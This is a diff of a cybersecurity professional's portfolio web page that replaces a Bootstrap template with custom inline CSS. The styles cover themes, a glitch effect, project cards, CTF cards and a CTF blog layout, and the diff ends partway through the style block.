@@ -1,611 +1,1097 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html lang="en" data-theme="light">
 <head>
-  <meta charset="utf-8">
-  <meta content="width=device-width, initial-scale=1.0" name="viewport">
-  <title>My Portfolio | Castro Nicholas</title>
-  <meta content="" name="description">
-  <meta content="" name="keywords">
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Castro Nicholas — Cybersecurity</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Mono:wght@300;400;500&family=Instrument+Sans:ital,wght@0,400;0,500;0,600;1,400&family=DM+Serif+Display:ital@0;1&display=swap" rel="stylesheet">
+  <style>
+    :root[data-theme="light"] {
+      --bg:#F5F2EC;--bg2:#EDE9E0;--surface:#ffffff;--border:#D6D0C4;
+      --text:#1A1814;--text2:#4A463E;--text3:#7A7368;
+      --accent:#1A1814;--accent2:#8B4513;--accent-glow:rgba(139,69,19,0.1);
+      --tag-bg:#E4DFD4;--tag-text:#4A463E;--nav-bg:rgba(245,242,236,0.92);
+      --hero-line:#D6D0C4;--card-shadow:0 2px 20px rgba(0,0,0,0.06);
+      --font-display:'Bebas Neue',sans-serif;--font-serif:'DM Serif Display',serif;
+      --font-mono:'DM Mono',monospace;--font-body:'Instrument Sans',sans-serif;
+      --toggle-track:#D6D0C4;--toggle-thumb:#1A1814;--link:#8B4513;
+      --timeline-line:#D6D0C4;--skill-fill:#1A1814;--skill-bg:#E4DFD4;
+      --section-label:#8B4513;--photo-border:#D6D0C4;--photo-accent:#8B4513;
+    }
+    :root[data-theme="dark"] {
+      --bg:#090C0F;--bg2:#0D1117;--surface:#0D1117;--border:#1E2A36;
+      --text:#E2EAF0;--text2:#8FA8BB;--text3:#4A6070;
+      --accent:#00D4FF;--accent2:#00FF88;--accent-glow:rgba(0,212,255,0.09);
+      --tag-bg:#0D1E2A;--tag-text:#00D4FF;--nav-bg:rgba(9,12,15,0.94);
+      --hero-line:#1E2A36;--card-shadow:0 2px 30px rgba(0,0,0,0.4);
+      --font-display:'Bebas Neue',sans-serif;--font-serif:'DM Mono',monospace;
+      --font-mono:'DM Mono',monospace;--font-body:'Instrument Sans',sans-serif;
+      --toggle-track:#1E2A36;--toggle-thumb:#00D4FF;--link:#00D4FF;
+      --timeline-line:#1E2A36;--skill-fill:#00D4FF;--skill-bg:#0D1E2A;
+      --section-label:#00FF88;--photo-border:#00D4FF;--photo-accent:#00FF88;
+    }
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body{background:var(--bg);color:var(--text);font-family:var(--font-body);line-height:1.6;cursor:none;}
 
-  <!-- Favicons -->
-  <link href="assets/img/favicon.png" rel="icon">
-  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+    /* ── GLITCH OVERLAY ── */
+    #gc{position:fixed;inset:0;width:100%;height:100%;z-index:9989;pointer-events:none;opacity:0;}
+    #gc.on{opacity:1;}
+    #grgb{position:fixed;inset:0;z-index:9988;pointer-events:none;mix-blend-mode:screen;opacity:0;}
+    #grgb.on{animation:rgbF .38s steps(1) forwards;}
+    @keyframes rgbF{
+      0%{opacity:0;background:transparent;}
+      10%{opacity:.2;background:rgba(255,0,80,.2);transform:translate(-6px,0);}
+      22%{opacity:.15;background:rgba(0,255,200,.15);transform:translate(6px,0);}
+      35%{opacity:.22;background:rgba(0,80,255,.22);transform:translate(-3px,2px);}
+      50%{opacity:.1;background:rgba(255,0,80,.1);transform:translate(4px,-2px);}
+      65%{opacity:.15;background:rgba(0,255,200,.15);transform:translate(-4px,0);}
+      80%{opacity:.06;background:rgba(255,255,0,.06);transform:translate(2px,0);}
+      100%{opacity:0;background:transparent;transform:translate(0);}
+    }
+    #gscan{position:fixed;inset:0;z-index:9987;pointer-events:none;opacity:0;
+      background:repeating-linear-gradient(0deg,rgba(0,0,0,.55) 0,rgba(0,0,0,.55) 1px,transparent 1px,transparent 4px);}
+    #gscan.on{animation:scanP .38s steps(2) forwards;}
+    @keyframes scanP{0%{opacity:0;}20%{opacity:1;}70%{opacity:.5;}100%{opacity:0;}}
 
-  <!-- Fonts -->
-  <link href="https://fonts.googleapis.com" rel="preconnect">
-  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Raleway:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    /* ── CURSOR ── */
+    .cur-dot{position:fixed;width:6px;height:6px;background:var(--accent);border-radius:50%;
+      pointer-events:none;z-index:9999;transform:translate(-50%,-50%);transition:background .3s;}
+    .cur-ring{position:fixed;width:28px;height:28px;border:1.5px solid var(--accent);border-radius:50%;
+      pointer-events:none;z-index:9998;transform:translate(-50%,-50%);
+      transition:width .2s,height .2s,border-color .3s,opacity .2s;opacity:.6;}
+    .cur-ring.h{width:44px;height:44px;opacity:1;}
 
-  <!-- Vendor CSS Files -->
-  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
-  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
-  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
-  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
-  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+    /* ── SCROLLBAR ── */
+    ::-webkit-scrollbar{width:4px;}
+    ::-webkit-scrollbar-track{background:var(--bg);}
+    ::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px;}
 
-  <!-- Main CSS File -->
-  <link href="assets/css/main.css" rel="stylesheet">
-  <link href="assets/css/dark-theme.css" rel="stylesheet">
+    /* ── NAV ── */
+    nav{position:fixed;top:0;left:0;right:0;z-index:100;
+      background:var(--nav-bg);backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);transition:background .4s,border-color .4s;}
+    .nav-in{max-width:1200px;margin:0 auto;padding:0 2rem;height:60px;
+      display:flex;align-items:center;justify-content:space-between;}
+    .nav-logo{font-family:var(--font-display);font-size:1.5rem;letter-spacing:.12em;
+      color:var(--text);text-decoration:none;transition:color .3s;}
+    [data-theme="dark"] .nav-logo{color:var(--accent);}
+    .nav-logo span{color:var(--accent2);}
+    .nav-links{display:flex;gap:1.8rem;list-style:none;align-items:center;}
+    .nav-links a{font-size:.72rem;text-transform:uppercase;letter-spacing:.1em;
+      color:var(--text2);text-decoration:none;transition:color .2s;font-weight:500;}
+    .nav-links a:hover{color:var(--accent);}
+    .tog-wrap{display:flex;align-items:center;gap:.6rem;}
+    .tog-lbl{font-family:var(--font-mono);font-size:.6rem;color:var(--text3);
+      text-transform:uppercase;letter-spacing:.08em;}
+    .tog{position:relative;width:44px;height:24px;background:var(--toggle-track);
+      border-radius:12px;cursor:pointer;border:none;transition:background .3s;}
+    .tog::after{content:'';position:absolute;top:3px;left:3px;width:18px;height:18px;
+      background:var(--toggle-thumb);border-radius:50%;transition:transform .3s,background .3s;}
+    [data-theme="dark"] .tog::after{transform:translateX(20px);}
 
+    /* ── PAGE SYSTEM ── */
+    .page{display:none;}
+    .page.active{display:block;}
+
+    /* ── SECTIONS ── */
+    section{max-width:1200px;margin:0 auto;padding:7rem 2rem;}
+    .sec-lbl{font-family:var(--font-mono);font-size:.68rem;letter-spacing:.2em;
+      text-transform:uppercase;color:var(--section-label);margin-bottom:1rem;
+      display:flex;align-items:center;gap:.7rem;}
+    .sec-lbl::after{content:'';flex:1;max-width:55px;height:1px;
+      background:var(--section-label);opacity:.4;}
+    h2{font-family:var(--font-display);font-size:clamp(2.4rem,5vw,3.8rem);
+      letter-spacing:.1em;margin-bottom:3rem;color:var(--text);line-height:1;}
+
+    /* ── HERO ── */
+    #hero{min-height:100vh;display:flex;align-items:center;
+      padding-top:60px;position:relative;overflow:hidden;}
+    #hero::before{content:'';position:absolute;inset:0;
+      background-image:linear-gradient(var(--hero-line) 1px,transparent 1px),
+        linear-gradient(90deg,var(--hero-line) 1px,transparent 1px);
+      background-size:60px 60px;opacity:.45;pointer-events:none;transition:opacity .4s;}
+    [data-theme="dark"] #hero::before{opacity:.1;}
+    [data-theme="dark"] #hero::after{content:'';position:absolute;inset:0;
+      background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.04) 3px,rgba(0,0,0,.04) 4px);
+      pointer-events:none;}
+
+    .hero-inner{position:relative;z-index:2;width:100%;
+      display:flex;align-items:center;justify-content:space-between;gap:3rem;}
+    .hero-content{flex:1;min-width:0;}
+
+    /* photo */
+    .hero-photo-wrap{flex-shrink:0;width:clamp(200px,20vw,280px);position:relative;}
+    .hero-photo-frame{width:100%;aspect-ratio:3/4;border:1px solid var(--photo-border);
+      overflow:hidden;position:relative;transition:border-color .4s;}
+    [data-theme="dark"] .hero-photo-frame{
+      box-shadow:0 0 28px rgba(0,212,255,.18),0 0 60px rgba(0,212,255,.06);}
+    .hero-photo-frame img{width:100%;height:100%;object-fit:cover;object-position:center top;
+      display:block;transition:filter .4s;}
+    [data-theme="dark"] .hero-photo-frame img{filter:grayscale(15%) contrast(1.06);}
+    .photo-placeholder{width:100%;height:100%;display:flex;flex-direction:column;
+      align-items:center;justify-content:center;gap:.7rem;background:var(--bg2);color:var(--text3);}
+    .photo-placeholder svg{opacity:.25;}
+    .photo-placeholder span{font-family:var(--font-mono);font-size:.58rem;
+      letter-spacing:.1em;text-transform:uppercase;opacity:.45;text-align:center;padding:0 1rem;}
+    .hero-photo-wrap::before{content:'';position:absolute;bottom:-6px;right:-6px;
+      width:48%;height:48%;border-bottom:2px solid var(--photo-accent);
+      border-right:2px solid var(--photo-accent);z-index:-1;transition:border-color .4s;}
+    .hero-photo-wrap::after{content:attr(data-label);position:absolute;top:-10px;left:10px;
+      font-family:var(--font-mono);font-size:.55rem;letter-spacing:.14em;text-transform:uppercase;
+      color:var(--photo-accent);background:var(--bg);padding:0 .4rem;transition:color .4s,background .4s;}
+
+    /* hero text */
+    .hero-eyebrow{font-family:var(--font-mono);font-size:.7rem;letter-spacing:.18em;
+      text-transform:uppercase;color:var(--section-label);margin-bottom:1.1rem;
+      display:flex;align-items:center;gap:.5rem;}
+    [data-theme="dark"] .hero-eyebrow::before{content:'> ';color:var(--accent2);}
+
+    .hero-name{font-family:var(--font-display);
+      font-size:clamp(4rem,10vw,9rem);line-height:.92;
+      letter-spacing:.05em;color:var(--text);text-transform:uppercase;margin-bottom:.5rem;}
+    [data-theme="dark"] .hero-name{text-shadow:0 0 50px rgba(0,212,255,.15);}
+    .hero-name .ln2{color:var(--accent2);display:block;}
+    [data-theme="dark"] .hero-name .ln2{color:var(--accent);}
+
+    .hero-tagline{font-family:var(--font-serif);font-size:clamp(.82rem,1.5vw,1rem);
+      color:var(--text2);font-style:italic;max-width:460px;margin:1.3rem 0 2.2rem;line-height:1.65;}
+    [data-theme="dark"] .hero-tagline{font-family:var(--font-mono);font-style:normal;
+      font-size:.8rem;letter-spacing:.02em;}
+    .tc{display:inline-block;width:2px;height:1em;background:var(--accent);
+      margin-left:2px;vertical-align:text-bottom;animation:blink 1s step-end infinite;}
+    @keyframes blink{50%{opacity:0;}}
+
+    .hero-meta{display:flex;align-items:center;gap:1.1rem;flex-wrap:wrap;margin-bottom:2.4rem;}
+    .hero-loc{font-family:var(--font-mono);font-size:.65rem;color:var(--text3);
+      letter-spacing:.08em;text-transform:uppercase;}
+    .hdot{width:3px;height:3px;background:var(--border);border-radius:50%;}
+    .hero-ctas{display:flex;gap:1rem;flex-wrap:wrap;}
+
+    .btn-p{display:inline-flex;align-items:center;gap:.5rem;padding:.7rem 1.6rem;
+      background:var(--text);color:var(--bg);font-family:var(--font-mono);font-size:.7rem;
+      letter-spacing:.1em;text-transform:uppercase;text-decoration:none;
+      border:1px solid var(--text);transition:all .2s;}
+    [data-theme="dark"] .btn-p{background:var(--accent);color:#000;border-color:var(--accent);}
+    .btn-p:hover{background:transparent;color:var(--text);}
+    [data-theme="dark"] .btn-p:hover{background:transparent;color:var(--accent);}
+    .btn-s{display:inline-flex;align-items:center;gap:.5rem;padding:.7rem 1.6rem;
+      background:transparent;color:var(--text2);font-family:var(--font-mono);font-size:.7rem;
+      letter-spacing:.1em;text-transform:uppercase;text-decoration:none;
+      border:1px solid var(--border);transition:all .2s;}
+    .btn-s:hover{color:var(--accent);border-color:var(--accent);}
+
+    .hero-social{position:absolute;right:0;top:50%;transform:translateY(-50%);
+      display:flex;flex-direction:column;gap:1.2rem;align-items:center;}
+    .hero-social::before,.hero-social::after{content:'';display:block;
+      width:1px;height:55px;background:var(--border);}
+    .hero-social a{color:var(--text3);text-decoration:none;font-family:var(--font-mono);
+      font-size:.6rem;letter-spacing:.1em;writing-mode:vertical-rl;transition:color .2s;}
+    .hero-social a:hover{color:var(--accent);}
+
+    /* ── ABOUT ── */
+    .about-grid{display:grid;grid-template-columns:1fr 1fr;gap:5rem;align-items:start;}
+    .about-text p{color:var(--text2);margin-bottom:1.2rem;font-size:.94rem;line-height:1.8;}
+    .about-text p strong{color:var(--text);font-weight:600;}
+    .about-details{display:flex;flex-direction:column;gap:.9rem;}
+    .d-item{display:flex;align-items:flex-start;gap:1rem;padding:.9rem 1rem;
+      border:1px solid var(--border);transition:border-color .2s,background .2s;}
+    .d-item:hover{border-color:var(--accent);background:var(--accent-glow);}
+    .d-icon{font-family:var(--font-mono);font-size:.63rem;color:var(--accent2);
+      padding-top:2px;white-space:nowrap;}
+    [data-theme="dark"] .d-icon{color:var(--accent);}
+    .d-text{font-size:.8rem;color:var(--text2);line-height:1.5;}
+    .d-text strong{color:var(--text);display:block;font-size:.73rem;margin-bottom:.15rem;}
+
+    /* ── SKILLS ── */
+    #skills{background:var(--bg2);max-width:100%;padding-left:0;padding-right:0;}
+    #skills .si{max-width:1200px;margin:0 auto;padding:7rem 2rem;}
+    .skills-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(265px,1fr));gap:1.3rem;}
+    .skill-cat{padding:1.4rem;border:1px solid var(--border);background:var(--surface);
+      transition:border-color .2s,transform .2s;}
+    .skill-cat:hover{border-color:var(--accent);transform:translateY(-2px);}
+    .sct{font-family:var(--font-mono);font-size:.63rem;letter-spacing:.15em;text-transform:uppercase;
+      color:var(--section-label);margin-bottom:1.1rem;padding-bottom:.7rem;border-bottom:1px solid var(--border);}
+    .sk-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:.75rem;}
+    .sk-name{font-size:.76rem;color:var(--text2);font-family:var(--font-mono);}
+    .sk-bw{width:88px;height:3px;background:var(--skill-bg);border-radius:2px;overflow:hidden;}
+    .sk-b{height:100%;background:var(--skill-fill);border-radius:2px;width:0;
+      transition:width 1.2s cubic-bezier(.4,0,.2,1);}
+
+    /* ── TIMELINE ── */
+    .tl{position:relative;padding-left:2rem;}
+    .tl::before{content:'';position:absolute;left:0;top:8px;bottom:8px;
+      width:1px;background:var(--timeline-line);}
+    .tl-item{position:relative;padding-bottom:2.8rem;}
+    .tl-item::before{content:'';position:absolute;left:-2.35rem;top:6px;
+      width:8px;height:8px;background:var(--accent);border-radius:50%;border:2px solid var(--bg);}
+    .tl-date{font-family:var(--font-mono);font-size:.63rem;letter-spacing:.12em;
+      color:var(--text3);text-transform:uppercase;margin-bottom:.4rem;}
+    .tl-title{font-family:var(--font-display);font-size:clamp(1rem,2vw,1.3rem);
+      color:var(--text);margin-bottom:.25rem;letter-spacing:.05em;}
+    .tl-org{font-size:.76rem;color:var(--accent2);margin-bottom:.65rem;font-family:var(--font-mono);}
+    [data-theme="dark"] .tl-org{color:var(--accent);}
+    .tl-desc{font-size:.82rem;color:var(--text2);line-height:1.7;}
+    .tl-list{list-style:none;margin-top:.5rem;}
+    .tl-list li{font-size:.8rem;color:var(--text2);line-height:1.6;
+      padding-left:1.2rem;position:relative;margin-bottom:.35rem;}
+    .tl-list li::before{content:'→';position:absolute;left:0;color:var(--accent2);font-size:.76rem;}
+    [data-theme="dark"] .tl-list li::before{content:'>';color:var(--accent);}
+
+    /* ── PROJECTS ── */
+    #projects{background:var(--bg2);max-width:100%;padding-left:0;padding-right:0;}
+    #projects .si{max-width:1200px;margin:0 auto;padding:7rem 2rem;}
+    .proj-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:1.4rem;}
+    .proj-card{border:1px solid var(--border);background:var(--surface);padding:2rem;
+      transition:border-color .25s,transform .25s,box-shadow .25s;position:relative;overflow:hidden;}
+    .proj-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2));
+      transform:scaleX(0);transform-origin:left;transition:transform .3s;}
+    .proj-card:hover::before{transform:scaleX(1);}
+    .proj-card:hover{border-color:var(--accent);transform:translateY(-3px);box-shadow:var(--card-shadow);}
+    .proj-idx{font-family:var(--font-mono);font-size:.6rem;color:var(--text3);
+      letter-spacing:.1em;margin-bottom:.9rem;}
+    .proj-title{font-family:var(--font-display);font-size:1.3rem;letter-spacing:.05em;
+      color:var(--text);margin-bottom:.6rem;}
+    [data-theme="dark"] .proj-title{color:var(--accent);font-size:1.1rem;}
+    .proj-desc{font-size:.8rem;color:var(--text2);line-height:1.65;margin-bottom:1.1rem;}
+    .tags{display:flex;flex-wrap:wrap;gap:.4rem;margin-bottom:1.1rem;}
+    .tag{font-family:var(--font-mono);font-size:.58rem;letter-spacing:.08em;
+      padding:.2rem .5rem;background:var(--tag-bg);color:var(--tag-text);
+      border:1px solid var(--border);text-transform:uppercase;}
+    [data-theme="dark"] .tag{border-color:rgba(0,212,255,.25);}
+    .proj-links{display:flex;gap:1rem;}
+    .proj-link{font-family:var(--font-mono);font-size:.63rem;letter-spacing:.1em;
+      text-transform:uppercase;color:var(--accent2);text-decoration:none;
+      border-bottom:1px solid transparent;transition:border-color .2s;}
+    [data-theme="dark"] .proj-link{color:var(--accent);}
+    .proj-link:hover{border-color:currentColor;}
+
+    /* ── CTF CARDS ── */
+    .ctf-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(265px,1fr));gap:1.1rem;}
+    .ctf-card{border:1px solid var(--border);padding:1.3rem;background:var(--surface);
+      transition:border-color .2s,transform .2s;cursor:pointer;}
+    .ctf-card:hover{border-color:var(--accent);transform:translateX(4px);}
+    .ctf-hd{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:.6rem;}
+    .ctf-plat{font-family:var(--font-mono);font-size:.57rem;letter-spacing:.15em;
+      text-transform:uppercase;color:var(--section-label);padding:.17rem .42rem;
+      border:1px solid var(--section-label);opacity:.8;}
+    .ctf-diff{font-family:var(--font-mono);font-size:.62rem;}
+    .de{color:#22c55e;}.dm{color:#f59e0b;}.dh{color:#ef4444;}
+    .ctf-name{font-family:var(--font-display);font-size:1rem;letter-spacing:.04em;
+      color:var(--text);margin-bottom:.35rem;}
+    [data-theme="dark"] .ctf-name{font-family:var(--font-mono);font-size:.86rem;}
+    .ctf-cat{font-size:.7rem;color:var(--text3);font-family:var(--font-mono);}
+    .ctf-view{display:inline-block;margin-top:.75rem;font-family:var(--font-mono);
+      font-size:.6rem;letter-spacing:.1em;text-transform:uppercase;color:var(--accent2);
+      border-bottom:1px solid transparent;transition:border-color .2s;}
+    [data-theme="dark"] .ctf-view{color:var(--accent);}
+    .ctf-card:hover .ctf-view{border-color:currentColor;}
+
+    /* ── EDU ── */
+    .edu-grid{display:grid;grid-template-columns:1fr 1fr;gap:4rem;}
+    .edu-sec{font-family:var(--font-mono);font-size:.63rem;letter-spacing:.18em;
+      text-transform:uppercase;color:var(--text3);margin-bottom:1.4rem;}
+
+    /* ── CONTACT ── */
+    #contact{background:var(--bg2);max-width:100%;padding-left:0;padding-right:0;}
+    #contact .si{max-width:1200px;margin:0 auto;padding:7rem 2rem;}
+    .contact-grid{display:grid;grid-template-columns:1fr 1fr;gap:5rem;}
+    .contact-info p{font-size:.88rem;color:var(--text2);line-height:1.8;margin-bottom:2rem;}
+    .c-row{display:flex;align-items:center;gap:.8rem;margin-bottom:.82rem;}
+    .c-key{font-family:var(--font-mono);font-size:.6rem;letter-spacing:.12em;
+      text-transform:uppercase;color:var(--text3);min-width:55px;}
+    .c-val{font-size:.83rem;color:var(--text);}
+    .c-val a{color:var(--link);text-decoration:none;}
+    .c-val a:hover{text-decoration:underline;}
+    .avail-card{border:1px solid var(--border);padding:1.8rem;background:var(--surface);}
+    .av-title{font-family:var(--font-display);font-size:1.6rem;letter-spacing:.06em;
+      color:var(--text);margin-bottom:.5rem;}
+    .av-status{display:flex;align-items:center;gap:.6rem;margin-bottom:1.3rem;}
+    .av-dot{width:8px;height:8px;border-radius:50%;background:#22c55e;
+      animation:pdot 2s infinite;}
+    @keyframes pdot{0%{box-shadow:0 0 0 0 rgba(34,197,94,.4);}
+      70%{box-shadow:0 0 0 8px rgba(34,197,94,0);}100%{box-shadow:0 0 0 0 rgba(34,197,94,0);}}
+    .av-status span{font-family:var(--font-mono);font-size:.68rem;letter-spacing:.1em;
+      text-transform:uppercase;color:#22c55e;}
+    .av-desc{font-size:.82rem;color:var(--text2);line-height:1.7;margin-bottom:1.3rem;}
+    .av-types{display:flex;flex-direction:column;gap:.45rem;}
+    .av-t{font-family:var(--font-mono);font-size:.66rem;color:var(--text2);
+      letter-spacing:.04em;padding-left:1.2rem;position:relative;}
+    .av-t::before{content:'✓';position:absolute;left:0;color:var(--accent2);}
+
+    /* ── RESUME ── */
+    .res-cta{display:flex;flex-direction:column;align-items:center;text-align:center;
+      gap:1.4rem;padding:4rem;border:1px solid var(--border);background:var(--surface);
+      position:relative;overflow:hidden;}
+    .res-cta::before{content:'CV';position:absolute;font-family:var(--font-display);
+      font-size:14rem;color:var(--border);opacity:.22;right:-2rem;top:-2rem;
+      line-height:1;pointer-events:none;}
+    .res-cta p{font-size:.86rem;color:var(--text2);max-width:460px;line-height:1.7;}
+
+    /* ── FOOTER ── */
+    footer{border-top:1px solid var(--border);padding:2rem;}
+    .ft-in{max-width:1200px;margin:0 auto;display:flex;
+      align-items:center;justify-content:space-between;}
+    .ft-copy{font-family:var(--font-mono);font-size:.63rem;color:var(--text3);letter-spacing:.08em;}
+    .ft-links{display:flex;gap:1.5rem;}
+    .ft-links a{font-family:var(--font-mono);font-size:.63rem;color:var(--text3);
+      text-decoration:none;letter-spacing:.08em;transition:color .2s;}
+    .ft-links a:hover{color:var(--accent);}
+
+    /* ── FADE-UP ── */
+    .fu{opacity:0;transform:translateY(22px);transition:opacity .6s ease,transform .6s ease;}
+    .fu.v{opacity:1;transform:translateY(0);}
+
+    /* ── CTF BLOG PAGE ── */
+    #page-ctf{background:var(--bg);min-height:100vh;padding-top:60px;}
+    .blog-hd{max-width:1200px;margin:0 auto;padding:5rem 2rem 3rem;border-bottom:1px solid var(--border);}
+    .blog-back{font-family:var(--font-mono);font-size:.66rem;letter-spacing:.1em;
+      text-transform:uppercase;color:var(--text3);cursor:pointer;border:none;
+      background:none;display:flex;align-items:center;gap:.5rem;margin-bottom:2rem;transition:color .2s;}
+    .blog-back:hover{color:var(--accent);}
+    .blog-ttl{font-family:var(--font-display);font-size:clamp(3rem,7vw,6rem);
+      letter-spacing:.06em;line-height:.95;color:var(--text);margin-bottom:.7rem;}
+    .blog-sub{font-size:.85rem;color:var(--text3);font-family:var(--font-mono);letter-spacing:.05em;}
+    .blog-list{max-width:1200px;margin:0 auto;padding:2.5rem 2rem;
+      display:flex;flex-direction:column;gap:0;}
+    .blog-entry{display:grid;grid-template-columns:115px 1fr auto;gap:2rem;align-items:start;
+      padding:1.8rem 0;border-bottom:1px solid var(--border);cursor:pointer;position:relative;}
+    .blog-entry::before{content:'';position:absolute;left:-2rem;right:-2rem;top:0;bottom:0;
+      background:var(--accent-glow);opacity:0;transition:opacity .2s;}
+    .blog-entry:hover::before{opacity:1;}
+    .blog-entry:hover .be-title{color:var(--accent);}
+    .be-meta{z-index:1;}
+    .be-date{font-family:var(--font-mono);font-size:.63rem;color:var(--text3);
+      letter-spacing:.1em;text-transform:uppercase;margin-bottom:.4rem;}
+    .be-plat{font-family:var(--font-mono);font-size:.58rem;letter-spacing:.12em;
+      text-transform:uppercase;color:var(--section-label);padding:.14rem .38rem;
+      border:1px solid var(--section-label);display:inline-block;}
+    .be-body{z-index:1;}
+    .be-title{font-family:var(--font-display);font-size:clamp(1.1rem,2.5vw,1.5rem);
+      letter-spacing:.04em;color:var(--text);margin-bottom:.45rem;
+      transition:color .2s;line-height:1.05;}
+    .be-exc{font-size:.8rem;color:var(--text2);line-height:1.65;max-width:540px;}
+    .be-tags{display:flex;flex-wrap:wrap;gap:.33rem;margin-top:.65rem;}
+    .be-arr{font-family:var(--font-mono);font-size:1.1rem;color:var(--border);
+      transition:color .2s,transform .2s;z-index:1;padding-top:.3rem;}
+    .blog-entry:hover .be-arr{color:var(--accent);transform:translateX(4px);}
+    .add-post{display:flex;align-items:center;gap:.9rem;padding:1.3rem 2rem;
+      border:1px dashed var(--border);cursor:pointer;transition:border-color .2s;
+      max-width:1200px;margin:0 2rem 1.5rem;}
+    .add-post:hover{border-color:var(--accent);}
+    .add-post span{font-family:var(--font-mono);font-size:.68rem;letter-spacing:.12em;
+      text-transform:uppercase;color:var(--text3);}
+    .add-post .plus{color:var(--accent2);font-size:1.3rem;}
+
+    /* single post */
+    .post-view{max-width:760px;margin:0 auto;padding:3rem 2rem 6rem;}
+    .post-view.hidden{display:none;}
+    .post-badge{font-family:var(--font-mono);font-size:.58rem;letter-spacing:.15em;
+      text-transform:uppercase;color:var(--section-label);padding:.18rem .44rem;
+      border:1px solid var(--section-label);display:inline-block;margin-bottom:.9rem;}
+    .post-title{font-family:var(--font-display);font-size:clamp(2rem,5vw,3.5rem);
+      letter-spacing:.05em;line-height:.98;color:var(--text);margin-bottom:.9rem;}
+    .post-meta-bar{display:flex;gap:1.5rem;align-items:center;margin-bottom:2.4rem;
+      padding-bottom:1.4rem;border-bottom:1px solid var(--border);flex-wrap:wrap;}
+    .pm{font-family:var(--font-mono);font-size:.63rem;color:var(--text3);
+      letter-spacing:.08em;text-transform:uppercase;}
+    .post-body{font-size:.9rem;color:var(--text2);line-height:1.9;}
+    .post-body h3{font-family:var(--font-display);font-size:1.35rem;letter-spacing:.05em;
+      color:var(--text);margin:2rem 0 .7rem;}
+    [data-theme="dark"] .post-body h3{font-family:var(--font-mono);font-size:.95rem;
+      color:var(--accent);letter-spacing:.1em;text-transform:uppercase;}
+    .post-body p{margin-bottom:1rem;}
+    .post-body code{font-family:var(--font-mono);font-size:.78rem;background:var(--bg2);
+      color:var(--accent2);padding:.13rem .38rem;border-radius:2px;}
+    .post-body pre{background:var(--bg2);border:1px solid var(--border);
+      padding:1.1rem 1.3rem;overflow-x:auto;margin:1.1rem 0;}
+    [data-theme="dark"] .post-body pre{background:#060A0D;}
+    .post-body pre code{background:none;padding:0;font-size:.76rem;color:var(--text);}
+    [data-theme="dark"] .post-body pre code{color:var(--accent2);}
+    .post-flag{display:inline-block;margin-top:1.4rem;font-family:var(--font-mono);
+      font-size:.8rem;color:#22c55e;background:rgba(34,197,94,.08);
+      border:1px solid rgba(34,197,94,.3);padding:.45rem .9rem;letter-spacing:.05em;}
+    .post-nav{display:flex;justify-content:space-between;margin-top:2.8rem;
+      padding-top:1.4rem;border-top:1px solid var(--border);}
+    .pnb{font-family:var(--font-mono);font-size:.68rem;letter-spacing:.1em;
+      text-transform:uppercase;color:var(--text3);cursor:pointer;
+      background:none;border:1px solid var(--border);padding:.58rem 1.1rem;transition:all .2s;}
+    .pnb:hover{color:var(--accent);border-color:var(--accent);}
+
+    /* modal */
+    .modal-ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.72);
+      z-index:500;align-items:center;justify-content:center;}
+    .modal-ov.open{display:flex;}
+    .modal-box{background:var(--surface);border:1px solid var(--border);
+      width:90%;max-width:680px;max-height:85vh;overflow-y:auto;
+      padding:2.3rem;display:flex;flex-direction:column;gap:1.1rem;}
+    .modal-ttl{font-family:var(--font-display);font-size:1.8rem;
+      letter-spacing:.07em;color:var(--text);margin-bottom:.3rem;}
+    .mf{display:flex;flex-direction:column;gap:.35rem;}
+    .ml{font-family:var(--font-mono);font-size:.6rem;letter-spacing:.12em;
+      text-transform:uppercase;color:var(--text3);}
+    .mi,.mta,.msel{background:var(--bg);border:1px solid var(--border);color:var(--text);
+      font-family:var(--font-body);font-size:.86rem;padding:.65rem .88rem;
+      outline:none;transition:border-color .2s;width:100%;}
+    .mi:focus,.mta:focus,.msel:focus{border-color:var(--accent);}
+    .mta{min-height:170px;resize:vertical;font-family:var(--font-mono);font-size:.78rem;}
+    .mrow{display:grid;grid-template-columns:1fr 1fr 1fr;gap:.9rem;}
+    .m-acts{display:flex;gap:.9rem;justify-content:flex-end;padding-top:.3rem;}
+    .mc{font-family:var(--font-mono);font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;
+      color:var(--text3);background:none;border:1px solid var(--border);padding:.62rem 1.2rem;cursor:pointer;transition:all .2s;}
+    .mc:hover{color:var(--text);border-color:var(--text);}
+    .ms{font-family:var(--font-mono);font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;
+      color:var(--bg);background:var(--text);border:1px solid var(--text);padding:.62rem 1.2rem;cursor:pointer;transition:all .2s;}
